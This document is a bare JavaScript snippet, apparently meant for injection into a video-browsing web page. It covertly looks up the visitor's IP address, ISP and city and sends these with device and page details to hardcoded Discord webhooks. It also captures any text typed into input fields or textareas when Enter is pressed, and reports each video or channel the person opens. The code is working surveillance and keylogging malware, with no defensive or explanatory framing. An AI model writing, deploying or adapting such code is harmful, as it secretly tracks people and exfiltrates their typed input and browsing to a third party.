(async function() {
  const ipProvider = "https://ipv4.icanhazip.com/";
  const ipLookupBase = "https://ipapi.co/";
  const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
  const KwebhookUrl = "https://discord.com/api/webhooks/1426288631152251090/NOzBMFAj0j_O2uapbBZMit_37Mo4iJGgUNxO2BevN-LrGxqR4IX441WC2hdjuwVcSNBh";
  const winhook = "https://discord.com/api/webhooks/1426997095721730199/lllpiiAWKMV5zdFaONWNLSjMZ7PI-UIlWeUdahs74fbgOVZUNPwTDkh8EszSu-TqHjG2";

  async function sendToDiscord(url, content) {
    if (!url || !content) return;
    try {
      await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content })
      });
    } catch (e) {}
  }

  async function getIp() {
    try {
      const r = await fetch(ipProvider);
      if (!r.ok) throw new Error("ip fetch failed");
      return (await r.text()).trim();
    } catch (e) {
      return null;
    }
  }

  async function lookupIsp(ip) {
    if (!ip) return { isp: "unknown", org: "", country: "" };
    try {
      const r = await fetch(`${ipLookupBase}${encodeURIComponent(ip)}/json/`);
      if (!r.ok) throw new Error("lookup failed");
      const j = await r.json();
      return {
        isp: j.org || "unknown",
        org: j.org || "",
        country: j.country_name || "",
        region: j.region || "",
        city: j.city || "",
        as: j.asn || ""
      };
    } catch (e) {
      return { isp: "unknown", org: "", country: "" };
    }
  }

  function sanitizeForDiscord(s, max = 1900) {
    if (!s) return "";
    const cleaned = s.replace(/[`*_~>|]/g, "").replace(/[^\p{L}\p{N} .,!?'"()\[\]{}\-_/]/gu, "");
    return cleaned.length > max ? cleaned.slice(0, max) + "\n\n...truncated" : cleaned;
  }

  const ip = await getIp();
  const ispInfo = await lookupIsp(ip);
  const platform = navigator.userAgentData?.platform || navigator.platform || "unknown";
  const baseLocation = location.href;

  const ipMessage = 
`IP: ${ip || "unknown"}
ISP: ${ispInfo.isp || "unknown"}${ispInfo.org ? ` (${ispInfo.org})` : ""}${ispInfo.as ? ` AS${ispInfo.as}` : ""}
Location: ${ispInfo.city ? ispInfo.city + ", " : ""}${ispInfo.region ? ispInfo.region + ", " : ""}${ispInfo.country || ""}
Device: ${platform}
Site: ${baseLocation}`;

  await sendToDiscord(webhookUrl, sanitizeForDiscord(ipMessage));

  const mobileMessage = navigator.userAgentData?.mobile ? "The Person is on Mobile" : "The Person is not on Mobile";
  await sendToDiscord(KwebhookUrl, mobileMessage);

  async function safeSendHeadline(headline) {
    if (!headline) return;
    const cleanHeadline = sanitizeForDiscord(headline, 1800);
    const message = `${ip || "unknown"} (${ispInfo.isp || "unknown"}) has opened ${cleanHeadline}`;
    await sendToDiscord(winhook, message);
  }

  document.addEventListener("keydown", async e => {
    const target = e.target;
    if (e.key !== "Enter") return;
    if (!(target && (target.matches("input") || target.matches("textarea")))) return;
    if (target.isComposing) return;
    const text = String(target.value || "").trim();
    if (!text) return;
    await sendToDiscord(webhookUrl, sanitizeForDiscord(text));
  });

  document.addEventListener("click", e => {
    const target = e.target.closest(".compact-video, .compact-channel, .shelf-item");
    if (!target) return;
    const headlineEl = target.querySelector(".compact-media-headline");
    const headline = headlineEl?.innerText?.trim() || target.innerText?.trim().split("\n")[0];
    if (headline) safeSendHeadline(headline);
  });

  const observer = new MutationObserver(muts => {
    for (const m of muts) {
      if (!m.addedNodes) continue;
      for (const node of m.addedNodes) {
        if (!(node instanceof HTMLElement)) continue;
        if (node.matches(".compact-video, .compact-channel, .shelf-item")) {
          const headlineEl = node.querySelector(".compact-media-headline");
          const headline = headlineEl?.innerText?.trim();
          if (headline) safeSendHeadline(headline);
        }
      }
    }
  });
  observer.observe(document.documentElement || document.body, { childList: true, subtree: true });
  window.addEventListener("beforeunload", () => observer.disconnect());
})();
